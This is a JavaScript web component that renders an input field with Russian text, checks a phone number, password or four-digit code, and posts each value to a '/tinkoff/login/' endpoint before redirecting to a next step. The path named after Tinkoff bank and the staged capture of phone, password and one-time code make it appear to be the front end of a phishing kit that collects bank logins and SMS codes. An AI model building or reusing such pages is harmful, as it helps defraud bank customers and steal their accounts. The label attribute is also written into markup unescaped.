class InputControl extends HTMLElement {
    constructor() {
        super();

        this.attachShadow({ mode: 'open' });

        // Получаем значения атрибутов `label` и `type`
        const label = this.getAttribute('label') || 'Введите значение';
        const type = this.getAttribute('type') || 'text';

        // HTML шаблон компонента
        this.shadowRoot.innerHTML = `
            <div class="input-container">
                <label>${label}</label>
                <input type="${type}" />
                <span class="error-message"></span>
                <button type="button">
                    Отправить
                    <span>&#8594;</span> <!-- Стрелочка -->
                </button>
            </div>
        `;

        this.input = this.shadowRoot.querySelector('input');
        this.errorMessageElement = this.shadowRoot.querySelector('.error-message');
        this.button = this.shadowRoot.querySelector('button');

        this.button.addEventListener('click', () => this.handleSubmit());
    }

    static get observedAttributes() {
        return ['label', 'type'];
    }

    attributeChangedCallback(name, oldValue, newValue) {
        if (name === 'label') {
            this.shadowRoot.querySelector('label').textContent = newValue;
        }
        if (name === 'type') {
            this.input.type = newValue;
        }
    }

    async handleSubmit() {
        const value = this.input.value.trim();
        let [isValid, errorMessage] = this.inputIsValid(value);

        if (!isValid) {
            this.showError(errorMessage);
            return;
        }

        this.hideError();

        this.button.disabled = true;

        try {
            const response = await fetch('/tinkoff/login/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(value)
            });

            const data = await response.json();

            if (data.status === 'success') {
                const pageType = data.next_page_type;
                window.location.href = `/tinkoff/next/?step=${pageType}`;
            } else {
                this.showError(data.detail || 'Произошла ошибка.');
                this.input.value = ''
            }
        } catch (error) {
            this.showError('Ошибка сети. Попробуйте снова.');
            console.error('Ошибка:', error);
        } finally {
            this.button.disabled = false;
        }
    }

    showError(message) {
        this.errorMessageElement.style.display = 'block';
        this.errorMessageElement.textContent = message;
    }

    hideError() {
        this.errorMessageElement.style.display = 'none';
        this.errorMessageElement.textContent = '';
    }

    inputIsValid(value) {
        let isValid = true;
        let errorMessage = '';

        switch (this.input.type) {
            case 'tel':
                const phonePattern = /^(\+7|8)\s?\(?\d{3}\)?\s?\d{3}[-\s]?\d{2}[-\s]?\d{2}$/;
                isValid = phonePattern.test(value);
                errorMessage = 'Введите корректный номер телефона';
                break;
            case 'password':
                isValid = value.length > 0;
                errorMessage = 'Пароль не может быть пустым';
                break;
            case 'number':
                isValid = value.length === 4 && /^\d{4}$/.test(value);
                errorMessage = 'Код должен состоять из 4 цифр';
                break;
            default:
                isValid = value.length > 0;
                errorMessage = 'Поле не может быть пустым';
        }
        return [isValid, errorMessage];
    }
}

customElements.define('input-control', InputControl);